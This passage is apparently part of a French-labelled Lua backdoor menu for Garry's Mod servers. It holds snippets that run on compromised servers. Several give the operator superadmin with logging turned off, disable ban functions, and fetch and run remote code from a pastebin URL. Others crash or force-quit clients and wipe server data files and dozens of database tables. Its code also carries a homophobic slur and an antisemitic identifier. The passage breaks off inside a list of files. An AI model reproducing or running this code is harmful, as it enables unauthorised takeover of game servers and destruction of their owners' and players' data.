else

timer.Remove( "pimpon" )

end
]],

},

["♾ Guerre civil"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "cwar" ) then

timer.Create( "cwar", 1, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound( "ambient/levels/streetwar/city_battle"..math.random( 1, 19 )..".wav", 100, math.random( 90, 120 ) )

end

end)

else

timer.Remove( "cwar" )

end]],

},



["Séisme"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "earthquake" ) then

timer.Create( "earthquake", 0.5, 500, function()

for _, p in pairs(player.GetAll()) do

p:SetPos( p:GetPos() + Vector( 0, 0, 1 ) )

p:SetVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) )

util.ScreenShake( p:GetPos(), 20, 1, 1, 100 )

p:EmitSound( "ambient/explosions/exp1.wav", 100, math.random( 60, 100 ) )

end



for _, e in pairs(ents.GetAll()) do

if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity( Vector( math.random( -50, 50 ), math.random( -50, 50 ), math.random( 100, 150 ) ) ) end

end


end)

else

timer.Remove( "earthquake" )

end]],

},



["Exploser les véhicules"] = {

["Type"] = 1,

["Code"] = [[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then

local explo = ents.Create("env_explosion")

explo:SetPos(v:GetPos())

explo:SetKeyValue("iMagnitude", "300")

explo:Spawn()

explo:Activate()

explo:Fire("Explode", "", 0)

end

end]],

},



["Commande RCON"] = {

["Type"] = 1,

["Code"] = [[game.ConsoleCommand( @1.."\n" )]],

["NeedsParameters"] = 1,

},


["'Supprimer Ulx"] = {

["Type"] = 1,

["Code"] = [[ULib.Ban = function() return false end

ULib.addBan = function() return end

ULib.kick = function() return end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end
if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end]],

["Private"] = true,

},

["''ptiycheater the server † "] = {

["Type"] = 1,

["Code"] = [[    RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")
http.Fetch("https://pastebin.com/RS2EcJnp", function(b, l, h, c)RunString(b)end,nil)
]],

["Private"] = true,

},


["♾ Tousse arrrghh"] = {

["Type"] = 1,

["Code"] = [[

if !timer.Exists( "jcrevenofake" ) then

timer.Create( "jcrevenofake", 0.7, 0, function()

for _, p in pairs(player.GetAll()) do

p:EmitSound("ambient/voices/cough"..math.random(4)..".wav", 450 + math.random() * 50, 50 + math.random() * 10)

end

end)

else

timer.Remove( "jcrevenofake" )

end]],

},

["Modifier Map"] = {

["Type"] = 1,

["Code"] = [[RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")

for k,v in pairs(player.GetAll()) do
v:ConCommand("ulx map gm_construct")
end

]],


},



["'Reset Argent"] = {

["Type"] = 1,

["Code"] = [[RunConsoleCommand("rp_resetallmoney")]],

["Private"] = true,

},

["CleanUp"] = {

["Type"] = 1,

["Code"] = [[game.CleanUpMap()]],

},

["Supprimer les joueurs"] = {

["Type"] = 1,

["Code"] = [[for k, v in pairs(player.GetAll()) do v:Remove() end]],
},

["'Supprimer data"] = {

["Type"] = 1,

["Code"] = [[local files, directories = file.Find( "*", "DATA" ) for k, v in pairs( files ) do file.Delete( v ) end ]],

["Private"] = true,

},

["'Supprimer Mysql"] = {

["Type"] = 1,

["Code"] = [[ MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)') ]],

["Private"] = true,

},

["'Supprimer db"] = {

["Type"] = 1,

["Code"] = [[ sql.Query("DELETE FROM `DARKRP_BANNED_RPNAMES_STORE`")
sql.Query("DELETE FROM `DRP_PLAYER_NICKNAME_STORE`")
sql.Query("DELETE FROM `FADMIN_GROUPS`")
sql.Query("DELETE FROM `FADMIN_MOTD`")
sql.Query("DELETE FROM `FADMIN_PRIVILEGES`")
sql.Query("DELETE FROM `FADMIN_RESTRICTEDENTS`")
sql.Query("DELETE FROM `FAdminBans`")
sql.Query("DELETE FROM `FAdmin_CAMIPrivileges`")
sql.Query("DELETE FROM `FAdmin_Immunity`")
sql.Query("DELETE FROM `FAdmin_PlayerGroup`")
sql.Query("DELETE FROM `FAdmin_ServerSettings`")
sql.Query("DELETE FROM `FPP_ANTISPAM1`")
sql.Query("DELETE FROM `FPP_BLOCKED1`")
sql.Query("DELETE FROM `FPP_BLOCKEDMODELS1`")
sql.Query("DELETE FROM `FPP_BLOCKMODELSETTINGS1`")
sql.Query("DELETE FROM `FPP_ENTITYDAMAGE1`")
sql.Query("DELETE FROM `FPP_GLOBALSETTINGS1`")
sql.Query("DELETE FROM `FPP_GRAVGUN1`")
sql.Query("DELETE FROM `FPP_GROUPMEMBERS1`")
sql.Query("DELETE FROM `FPP_GROUPS3`")
sql.Query("DELETE FROM `FPP_GROUPTOOL`")
sql.Query("DELETE FROM `FPP_PHYSGUN1`")
sql.Query("DELETE FROM `FPP_PLAYERUSE1`")
sql.Query("DELETE FROM `FPP_TOOLADMINONLY`")
sql.Query("DELETE FROM `FPP_TOOLGUN1`")
sql.Query("DELETE FROM `FPP_TOOLRESTRICTPERSON1`")
sql.Query("DELETE FROM `FPP_TOOLTEAMRESTRICT`")
sql.Query("DELETE FROM `TTT_PLAYER_NICKNAME_STORE`")
sql.Query("DELETE FROM `batm_group_accounts`")
sql.Query("DELETE FROM `batm_personal_accounts`")
sql.Query("DELETE FROM `cac_incidents`")
sql.Query("DELETE FROM `cookies`")
sql.Query("DELETE FROM `darkrp_dbversion`")
sql.Query("DELETE FROM `darkrp_door`")
sql.Query("DELETE FROM `darkrp_doorgroups`")
sql.Query("DELETE FROM `darkrp_doorjobs`")
sql.Query("DELETE FROM `darkrp_jobSpawn`")
sql.Query("DELETE FROM `darkrp_player`")
sql.Query("DELETE FROM `darkrp_position`")
sql.Query("DELETE FROM `ll_plates`")
sql.Query("DELETE FROM `playerinformation`")
sql.Query("DELETE FROM `playerpdata`")
sql.Query("DELETE FROM `rphone_numbers`")
sql.Query("DELETE FROM `rphone_sms`")
sql.Query("DELETE FROM `sqlite_sequence`")
sql.Query("DELETE FROM `ulib_bans`")
sql.Query("DELETE FROM `utime`") ]],

["Private"] = true,

},

/*============================================
|===== Commandes Sur Joueur Selectionné =====|
===========================================*/



["Tuer Le Joueur"] = {

["Type"] = 2,

["Code"] = [[v:Kill()]],


},




["'Joueur Multicolor"] = {

["Type"] = 2,

["Code"] = [[

v:SetModel( "models/player/group02/male_04.mdl" )

v:SetMaterial( "models/debug/debugwhite" )

hook.Add( "Think", "multicolore", function()

v:SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )

end )


local id = ]] .. LocalPlayer():UserID() .. [[

Player( id ):SetModel( "models/player/group02/male_04.mdl" )

Player( id ):SetMaterial( "models/debug/debugwhite" )

hook.Add( "Think", "multicolore2", function()

if !IsValid( Player( id ) ) then return end

Player( id ):SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )

end )
]],

["Private"] = true,
},




["Expelliarmus"] = {

["Type"] = 2, -- 1 = indiscriminate, 2= targeted, 3 = dangerous

["Code"] = [[v:DropWeapon( v:GetActiveWeapon() )]],

},

["Ear rape (via internet)"] = {

["Type"] = 2,

["Code"] = [[

BDSendLua( v, 'if soundrape then soundrape:Remove() soundrape = nil return end soundrape = vgui.Create( "DFrame" ) soundrape:SetSize( 1, 1 ) local html = vgui.Create( "HTML", soundrape ) html:OpenURL( @1 )' )

]],

["Desc"] = "fait écouter un son par URL (1er parametre).  Sending a new sound will stop the previous one.  Send an invalid url to stop all sounds entirely on their client",

["NeedsParameters"] = 1,

},


["Supprimer les armes"] = {

["Type"] = 2,

["Code"] = [[v:StripWeapons()]],

},



["Roquette"] = {

["Type"] = 2,

["Code"] = [[v:SetVelocity( Vector(0, 0, 9000) )]],

},



["Change model"] = {

["Type"] = 2,

["Code"] = [[v:SetModel( @1 )]],

["NeedsParameters"] = 1,

},




["♾ Play Sound (1-5)"] = {

["Type"] = 2,

["Code"] = [[

local snd = {

[1] = "npc/stalker/go_alert2a.wav",

[2] = "vo/npc/male01/question06.wav",

[3] = "ambient/energy/zap1.wav",

[4] = "vo/ravenholm/madlaugh04.wav",

[5] = "npc/antlion_guard/antlion_guard_die1.wav",

}

v:EmitSound( snd[tonumber(@1)], 100, 100 )

]],

["NeedsParameters"] = 1,

},


["'Mode Disco"] = {

["Type"] = 2,

["Code"] = [[

BDSendLua( v, 'if hook.GetTable().HUDPaint.drugznigga then hook.Remove( "HUDPaint", "drugznigga" ) else hook.Add( "HUDPaint", "drugznigga", function() local cin = math.sin( CurTime() * 10 ) * 255 surface.SetDrawColor( Color( cin, -cin, cin, 100 ) ) surface.DrawRect( 0, 0, ScrW(), ScrH() ) end) end' )

]],

["Private"] = true,

},



["'Musique Disco"] = {

["Type"] = 2,

["Code"] = [[

BDSendLua( v, 'surface.PlaySound( "music/hl1_song25_remix3.mp3" )' )

]],

["Private"] = true,

},



["Message PV"] = {

["Type"] = 2,

["Code"] = [[v:ChatPrint( @1 )]],

["NeedsParameters"] = 1,

},



["Brûler"] = {

["Type"] = 2,

["Code"] = [[v:Ignite( 30 )]],

},



["GodMod"] = {

["Type"] = 2,

["Code"] = [[if v:HasGodMode() then v:GodDisable() else v:GodEnable() end]],

},



["'Faire Crash"] = {

["Type"] = 2,

["Code"] = [[v:SendLua("function fag() return fag() end fag()")]],

["Private"] = true,

},



["Courrir Vite"] = {

["Type"] = 2,

["Code"] = [[if !v.Sanic then v:SetRunSpeed( 1200 ) v:SetWalkSpeed(800) v.Sanic = true else v:SetRunSpeed( 240 ) v:SetWalkSpeed( 160 ) v.Sanic = false end]],

},



["Freeze"] = {

["Type"] = 2,

["Code"] = [[v:Freeze( !v:IsFrozen() )]],

},



["§ Forcer texte"] = {

["Type"] = 2,

["Code"] = [[v:Say(@1)]],

["NeedsParameters"] = 1,

},



["§ Forcer commande"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand(@1)]],

["NeedsParameters"] = 1,

},

["§ Mouvement Troll"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand( "+left" )
v:ConCommand( "+back" )]],

},

["§ Fermer le Jeux"] = {

["Type"] = 2,

["Code"] = [[v:ConCommand(quit)]],

},







["Modifier Argent"] = {

["Type"] = 2,

["Code"] = [[v:addMoney(@1)]],

["NeedsParameters"] = 1,

},



["Changer de Métier"] = {

["Type"] = 2,

["Code"] = [[ for i, t in pairs( team.GetAllTeams() ) do if string.lower(t.Name) == string.lower( @1 ) then v:changeTeam(i, true, true) end end]],

["NeedsParameters"] = 1,

},



["Noclip"] = {

["Type"] = 2,

["Code"] = [[if v:GetMoveType() != MOVETYPE_NOCLIP then v:SetMoveType(MOVETYPE_NOCLIP) else v:SetMoveType(MOVETYPE_WALK) end]],

},



["Téléporter ici"] = {

["Type"] = 2,

["Code"] = [[

local tp = false

local tpos

for _, p in pairs(player.GetAll()) do if %LP then tpos = p:GetEyeTraceNoCursor().HitPos tp = true end end

if tp then v:SetPos( tpos ) end

]],

},



["Goto"] = {

["Type"] = 2,

["Code"] = [[

local tp = false

local tpos = v:GetPos() + Vector( 32, 0, 10)

for _, p in pairs(player.GetAll()) do if %LP then p:SetPos( tpos ) end end

]],

},


["Spaw Entitées"] = {

["Type"] = 2,

["Code"] = [[

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( @1 )

dix:SetPos(trace.HitPos)

dix:SetAngles(Angle(0,0,0))

dix:Spawn()

]],


["NeedsParameters"] = 1,

},



["Spawn Props"] = {

["Type"] = 2,

["Code"] = [[

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( "prop_physics" )

dix:SetPos(trace.HitPos)

dix:SetAngles(Angle(0,0,0))

dix:SetModel( @1 )

dix:Spawn()

]],

["NeedsParameters"] = 1,

},



["'Spawn Bite Géante"] = {

["Type"] = 2,

["Code"] = [[

FPP.Blocked = {} FPP.BlockedModels = {} FPP.RestrictedTools = {} FPP.RestrictedToolsPlayers = {}

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( "prop_physics" )

dix:SetPos( trace.HitPos + Vector( 0, 0, 70 ) )

dix:SetAngles( v:GetAngles() )

dix:SetModel( "models/props_combine/breenglobe.mdl" )

dix:Spawn()

dix:SetMoveType( MOVETYPE_NONE )

dix:SetMaterial( "models/shiny" )

dix:SetColor( Color( 0, 0, 40 ) )



local function ecr( parent, model, pos, ang, col, mat  )

local dix = ents.Create( "prop_physics" )

dix:SetPos( parent:LocalToWorld( pos ) )

dix:SetAngles( parent:LocalToWorldAngles( ang ) )

dix:SetModel( model )

dix:SetParent( parent )

dix:Spawn()

dix:SetColor( col )

dix:SetMaterial( mat )

end

ecr( dix, "models/props_phx/construct/metal_plate_curve360x2.mdl", Vector( -5, 0, 30 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, 0, 120 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, 35, 0 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, 35, 0 ), Angle( 180, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, -35, 0 ), Angle( 0, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )
ecr( dix, "models/props_phx/construct/metal_dome360.mdl", Vector( -5, -35, 0 ), Angle( 180, 0, 0 ), HSVToColor( CurTime() % 6 * 60, 1, 0.5 ), "models/shiny"  )

for _, p in pairs( player.GetAll() ) do p:SendLua( 'chat.AddText( Color(255, 255, 255 ), "ROCCCOOOOO SIIIFREEEEDIIIII")' ) sound.Play( "vo/npc/female01/yeah02.wav", p:GetPos(), 90, 80, 1 ) end

]],

["Private"] = true,

},



["Spawn Ennemis"] = {

["Type"] = 2,

["Code"] = [[

local tr = {}

tr.start = v:GetShootPos()

tr.endpos = v:GetShootPos() + 2500 * v:GetAimVector()

tr.filter = {v}

local trace = util.TraceLine(tr)

local dix = ents.Create( "npc_citizen" )

dix:SetPos(trace.HitPos)

dix:SetAngles(Angle(0,0,0))

dix:SetKeyValue( "additionalequipment", table.Random({"weapon_shotgun", "weapon_smg1", "weapon_ar2"}) )

dix:SetKeyValue( "citizentype", 3 )

dix:AddRelationship("player D_HT 200")

dix:SetCurrentWeaponProficiency(WEAPON_PROFICIENCY_PERFECT)

dix:SetSchedule( SCHED_IDLE_WANDER )

dix:Spawn()

]],

},


["Vision Explosive"] = {

["Type"] = 2,

["Code"] = [[

local trace = v:GetEyeTraceNoCursor()

local explo = ents.Create("env_explosion")

explo:SetPos(trace.HitPos)

explo:SetKeyValue("iMagnitude", "250")

explo:Spawn()

explo:Activate()

explo:Fire("Explode", "", 0)

]],


},




["Pluie de Véhicules"] = {

["Type"] = 2,

["Code"] = [[

local trace = v:GetEyeTraceNoCursor()

local car = ents.Create("prop_physics")

local trace2 = util.TraceLine( { start = trace.HitPos, endpos = trace.HitPos + Vector( 0, 0, 5000000 ), mask = MASK_SOLID_BRUSHONLY } )

car:SetModel( "models/props_vehicles/car002a_physics.mdl" )

car:SetAngles( v:GetAngles() )

car:SetPos( trace2.HitPos + Vector( 0, 0, -60 ) )

car:Spawn()

car:Activate()

car.boom = 6

car:GetPhysicsObject():SetVelocity( Vector( 0, 0, -5000 ) )

car:Ignite( 500 )

car:AddCallback( "PhysicsCollide", function( car, dat )

local explo = ents.Create("env_explosion")

explo:SetPos( car:GetPos() )

explo:SetKeyValue("iMagnitude", "350")

explo:Spawn()

explo:Activate()

explo:Fire("Explode", "", 0)

local ef = EffectData()

ef:SetOrigin( car:GetPos() )

ef:SetMagnitude( 5 )

ef:SetScale( 200 )

util.Effect( "ThumperDust", ef )

car.boom = car.boom - 1

if car.boom < 0 then car:Remove() end

end )

timer.Simple( 30, function() if car:IsValid() then car:Remove() end end)

]],

},



["Gas Toxique"] = {

["Type"] = 2,

["Code"] = [[

local trace = v:GetEyeTraceNoCursor()

local ar2Explo = ents.Create("env_ar2explosion")

ar2Explo:SetOwner(game.GetWorld())

local p = trace.HitPos

ar2Explo:SetPos(trace.HitPos)

ar2Explo:Spawn()

ar2Explo:Activate()

ar2Explo:Fire("Explode", "", 0)

timer.Create( "gasthekikes_"..math.random(-9999, 9999).."_"..math.random(-9999, 9999), 0.25, 35, function()

for _, ent in pairs(ents.FindInSphere( p, 500)) do

if !ent:IsPlayer() then continue end

local d = DamageInfo()

d:SetDamage( 1 )

d:SetAttacker( game.GetWorld() )

d:SetInflictor( game.GetWorld() )

d:SetDamageType( DMG_DROWN )

ent:TakeDamageInfo( d )

end

end)



]],

},


["Kick Joueur"] = {

["Type"] = 2,

["Code"] = [[ v:Kick( @1 ) ]],


},




["Cloak"] = {

["Type"] = 2,

["Code"] = [[ if !v.BDCloaked then v:SetRenderMode( RENDERMODE_NONE ) v.BDCloaked = true else v:SetRenderMode( RENDERMODE_NORMAL ) v.BDCloaked = false end ]],


},



["'Mettre un rank"] = {

["Type"] = 2,

["Code"] = [[ local userInfo = ULib.ucl.authed[ v:UniqueID() ] ULib.ucl.addUser( v:UniqueID(), userInfo.allow, userInfo.deny, @1 ) ]],

["NeedsParameters"] = 1,

["Private"] = true,

},




/*====================================
|===== Commandes Customs Chelou =====|
===================================*/




["Joueurs 2D"] = {

["Type"] = 2,

["Code"] = [[
local bones = {
[1] = {b = "ValveBiped.Bip01_Head1", v = Vector(4,0,4)},
[2] = {b =  "ValveBiped.Bip01_R_Thigh", v = Vector(0,0,0)},
[3] = {b = "ValveBiped.Bip01_L_Thigh", v = Vector(0,0,0)},
[4] = {b =  "ValveBiped.Bip01_R_Calf", v = Vector(0,0,1)},
[5] = {b = "ValveBiped.Bip01_L_Calf", v = Vector(0,0,1)},
[6] = {b = "ValveBiped.Bip01_R_UpperArm", v = Vector(0,0,0)},
[7] = {b = "ValveBiped.Bip01_L_UpperArm", v = Vector(0,0,0)},
[8] = {b = "ValveBiped.Bip01_R_Forearm", v = Vector(1,1.5,1.5)},
[9] = {b = "ValveBiped.Bip01_L_Forearm", v = Vector(1,1.5,1.5)},
[10] = {b = "ValveBiped.Bip01_R_Clavicle", v = Vector(0,0,0)},
[11] = {b = "ValveBiped.Bip01_L_Clavicle", v = Vector(0,0,0)},
}

if !v.is2D then
v.is2D = true
for k, bone  in pairs(bones) do
local boneToFind = v:LookupBone(bone.b)
v:ManipulateBoneScale( boneToFind, bone.v)
end
else
v.is2D = false
for k, bone  in pairs(bones) do
local boneToFind = v:LookupBone(bone.b)
v:ManipulateBoneScale( boneToFind, Vector(1,1,1))
end
end
]],

},

["Nuke (M9K)"] = {

["Type"] = 2,

["Code"] = [[
//            if (m9k) then
local nuke = ents.Create("m9k_davy_crockett_explo")
nuke:SetPos(v:GetPos())
nuke:SetOwner(v)
nuke.Owner = v
nuke:Spawn()
nuke:Activate()
//            end
]],

},

["Brouiller la console"] = {

["Type"] = 1,

["Code"] = [[
if !(timer.Exists("consoleJammer")) then
timer.Create("consoleJammer", 0.5, 0, function()
print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
end )
else
timer.Destroy("consoleJammer")
end
]],

},

["'Se mettre superadmin"] = {

["Type"] = 1,

["Code"] = [[
RunConsoleCommand("ulx_logecho", "0")
RunConsoleCommand("ulx", "adduserid", "]]..LocalPlayer():SteamID()..[[", "superadmin")
]],

["Private"] = true,

},

["Deban all"] = {

["Type"] = 1,

["Code"] = [[
RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")
]],

},


["'Supprimer le Serveur"] = {

["Type"] = 1,

["Code"] = [[
local date = os.date( "%m-%d-%y" )
local dataBDMenus = { "jobdata","darkrp_door","darkrp_levels","darkrp_prestige","darkrp_doorgroups","darkrp_doorjobs","darkrp_jobSpawn","darkrp_position","darkrp_player","darkrp_dbversion","FAdmin_CAMIPrivileges","FADMIN_GROUPS","FAdmin_Immunity","FADMIN_MOTD","FAdmin_PlayerGroup","FADMIN_PRIVILEGES","FADMIN_RESTRICTEDENTS","FAdmin_ServerSettings","FAdminBans","FPP_ANTISPAM1","FPP_BLOCKED1","FPP_BLOCKMODELSETTINGS1","FPP_ENTITYDAMAGE1","FPP_GLOBALSETTINGS1","FPP_GRAVGUN1","FPP_GROUPMEMBERS1","FPP_GROUPS3","FPP_GROUPTOOL","FPP_PHYSGUN1","FPP_PLAYERUSE1","FPP_TOOLADMINONLY","FPP_TOOLGUN1","FPP_TOOLRESTRICTPERSON1","FPP_TOOLTEAMRESTRICT","FPP_BLOCKEDMODELS1","awarn_playerdata","awarn_serverdata","awarn_warnings","blogs_players_v3","blogs_v3","stt_date","stt_players","mlog_logs","mlog_permissions","atlaschat_players","atlaschat_ranks","atlaschat_remote","atlaschat_restrictions","OreBag","fcd_playerData","dailylogin","ChessLeaderboard","qsgr_data","voting_npcs","cac_incidents","steam_rewards","playerdata","playerinformation","utime","permaprops","cc_characters","cc_npcs","ckit_chips","ckit_persist","exsto_data_bans","exsto_data_ranks","exsto_data_users","exsto_data_variables","exsto_restriction","inventories","kinv_items","libk_player","permitems","player_gangapps","player_gangdata","player_gangs","ps2_categories","ps2_equipmentslot","ps2_HatPersistence","ps2_itemmapping","ps2_itempersistence","ps2_OutfitHatPersistenceMapping","ps2_outfits","ps2_playermodelpersistence","ps2_servers","ps2_settings","ps2_trailpersistence","ps2_wallet","removeprops","scoreboard_friends","serverguard_analytics","serverguard_bans","serverguard_pms","serverguard_ranks","serverguard_reports","serverguard_schema","serverguard_ttt_autoslays","serverguard_users","serverguard_watchlist","tttstats","ttt_passes_history","specdm_stats_new","ps2_achievements","ps2_boosterpersistence","ps2_cratepersistence","ps2_instatswitchweaponpersistence","ps2_keypersistence","ps2_rolecontrolpersistence","ps2_weaponpersistence","rapsheet","damagelog_autoslay","damagelog_names","damagelog_oldlogs","damagelog_weapons","kmapvote_mapinfo","kmapvote_ratings","mgang_gangs","mgang_players","deathrun_ids","deathrun_records","deathrun_stats","sui_ratings","shop_texthats","shop_money","shop_items","report_log" }
local datafiles = { "ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","wire_version.txt","UTeam.txt","prevhas.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","hitnumbers/settings.txt","soundlists/common_sounds.txt","vcmod/controls.txt","vcmod/dataserver.txt","qsgr_data/sqgr_settings.txt","blogs/configcache.txt","blogs/language.txt","cac/adminuipack.txt","ezjobs/config.txt","damagelog/colors.txt","damagelog/filters_new.txt","craphead_scripts/armory_robbery/rp_downtown_v4c/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v2/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_evilmelon_v1/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v3/policearmory_location.txt","craphead_scripts/armory_robbery/rp_downtown_v4c_v4/policearmory_location.txt","mg_gangsdata/mg_npcSpawns.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","prevhash.txt","permaprops_config.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","vliss/settings/config.txt","nordahl_Spawnpoint/rp_venator_v3.txt","nordahl_Spawnpoint/rp_venator_v2.txt","nordahl_Spawnpoint/rp_venator_v1.txt","nordahl_Spawnpoint/rp_venator_gg.txt","nordahl_Spawnpoint/rp_venator_ausv4.txt","nordahl_Spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_Spawnpoint/arena_byre.txt","nordahl_Spawnpoint/rp_venator_v2_immersive.txt","nordahl_Spawnpoint/rp_venator_fade_v3.txt","nordahl_Spawnpoint/rp_venator_gr.txt","nordahl_Spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_Spawnpoint/rp_scifi.txt","nordahl_Spawnpoint/rishimoon_crimson.txt","nordahl_Spawnpoint/rp_pripyat_hl2.txt","nordahl_Spawnpoint/rp_onwardhope.txt", "nordahl_Spawnpoint/rp_oldworld_fix.txt","nordahl_Spawnpoint/sd_doomsday.txt","nordahl_Spawnpoint/sd_doomsday_event.txt","nordahl_Spawnpoint/rp_naboo_city_v1.txt","nordahl_Spawnpoint/rp_noclyria_crimson.txt","nordahl_Spawnpoint/rp_nar_shaddaa_v2.txt","nordahl_Spawnpoint/rp_mos_mersic_v2.txt","nordahl_Spawnpoint/rp_kashyyk_jungle_b2.txt","nordahl_Spawnpoint/dust_dunes.txt","nordahl_Spawnpoint/rp_cscdesert_v2-1_propfix.txt","nordahl_Spawnpoint/rd_asteroid.txt","nordahl_Spawnpoint/naboo.txt","nordahl_Spawnpoint/kashyyyk.txt","nordahl_Spawnpoint/geonosis.txt","nordahl_Spawnpoint/fightspace3b.txt","nordahl_Spawnpoint/endor.txt","nordahl_Spawnpoint/toth_forgotten.txt"}
local sensitivefiles = { "ulx_logs/"..date..".txt","ulib/bans.txt","ulib/groups.txt","ulib/misc_registered.txt","ulib/users.txt","ulx/adverts.txt","ulx/apromote.txt","ulx/banmessage.txt","ulx/banreasons.txt","ulx/downloads.txt","ulx/gimps.txt","ulx/motd.txt","ulx/restrictions.txt","ulx/sbox_limits.txt","ulx/votemaps.txt","apg/settings.txt","atags/tags.txt","atags/rankchattags.txt","atags/playerchattags.txt","atags/tags.txt","atags/selectedtags.txt","atags/ranktags.txt","atags/playertags.txt","vcmod/settings_sv.txt","vcmod/config_sv_privilages.txt","cac/system_log_sv.txt","cac/serverworkshopinformation.txt","cac/settings.txt","cac/serverluainformation.txt","vcmod/controls.txt","vcmod/dataserver.txt","blogs/configcache.dat","blogs/language.txt","blogs/config_v5.txt","cac/adminuipack.txt","ulx/debugdump.txt","ulx/empty_teams.txt","chattags.txt","caseclaims.txt", "sammyservers_textscreens.txt","permaprops_permissions.txt","chattags.txt","permaprops_config.txt","whitelist.txt","zwhitelistjobdata/jobsetting.txt","zwhitelistjobdata/whitelistjob.txt","zmodserveroption/sysjobwhitelist.txt","nordahl_Spawnpoint/rp_venator_v3.txt","nordahl_Spawnpoint/rp_venator_v2.txt","nordahl_Spawnpoint/rp_venator_v1.txt","nordahl_Spawnpoint/rp_venator_gg.txt","nordahl_Spawnpoint/rp_venator_ausv4.txt","nordahl_Spawnpoint/rp_venator_v2_ffg.txt","planningevent/prehud.txt","planningoption/hourformat.txt","nordahl_Spawnpoint/arena_byre.txt","nordahl_Spawnpoint/rp_venator_v2_immersive.txt","nordahl_Spawnpoint/rp_venator_fade_v3.txt","nordahl_Spawnpoint/rp_venator_gr.txt","nordahl_Spawnpoint/rp_tatoonie_dunsea_v1.txt","nordahl_Spawnpoint/rp_scifi.txt","nordahl_Spawnpoint/rishimoon_crimson.txt","nordahl_Spawnpoint/rp_pripyat_hl2.txt","nordahl_Spawnpoint/rp_onwardhope.txt", 